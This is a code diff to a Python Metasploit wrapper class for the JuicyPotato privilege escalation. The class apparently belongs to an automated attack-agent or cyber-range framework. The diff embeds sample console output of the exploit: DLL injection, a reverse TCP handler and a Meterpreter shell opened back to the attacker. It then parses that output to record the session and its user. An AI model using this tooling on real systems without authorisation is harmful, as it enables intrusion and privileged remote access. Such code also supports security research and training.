@@ -79,12 +79,50 @@ class MSFJuicyPotato(MSFPrivilegeEscalation):
         obs.add_raw_obs(output)
         obs.set_success(False)
         session_handler._log_debug(output)
+        session = None
         """
-        example output
+        [*] Started reverse TCP handler on 0.0.0.0:4445
+        [+] Target appears to be vulnerable (Windows 2008 R2 Service Pack 1)
+        [*] Launching notepad to host the exploit...
+        [+] Process 1780 launched.
+        [*] Reflectively injecting the exploit DLL into 1780...
+        [*] Injecting exploit into 1780...
+        [*] Exploit injected. Injecting exploit configuration into 1780...
+        [*] Configuration injected. Executing exploit...
+        [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+        [*] Sending stage (200774 bytes) to 10.46.64.100
+        [*] Meterpreter session 5 opened (10.46.64.10:4445 -> 10.46.64.100:49163) at 2024-02-05 04:48:28 +0000
+        [*] Backgrounding session 5...
         """
         for line in output.split('\n'):
-          print(line)
-        obs.set_success(True)
+          #print(line)
+          if '[*] Meterpreter session' in line:
+              obs.set_success(True)
+              #print(list(enumerate(line.split(' '))))
+              split = line.split(' ')
+              session = int(split[3])
+              if '-' in split[5]:
+                  temp = split[5].replace('(', '').split(':')[0]
+                  origin, rip = temp.split('-')
+                  # obs.add_process(remote_address=rip, local_address=origin)
+                  rport = None
+              else:
+                  rip, rport = split[5].replace('(', '').split(':')
+              lip, lport = split[7].replace(')', '').split(':')
+              obs.add_process(hostid=str(self.ip_address), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
+        if session == None:
+            obs = Observation()
+            obs.set_success(False)
+            return obs
+        # get user id of session
+        #print("get user from session")
+        user = session_handler.get_session_user(session)
+        #print(user)
+        if user is None:
+          obs = Observation()
+          obs.set_success(False)
+        else:
+          obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
         return obs
 
     def test_exploit_works(self, target_host: Host) ->\
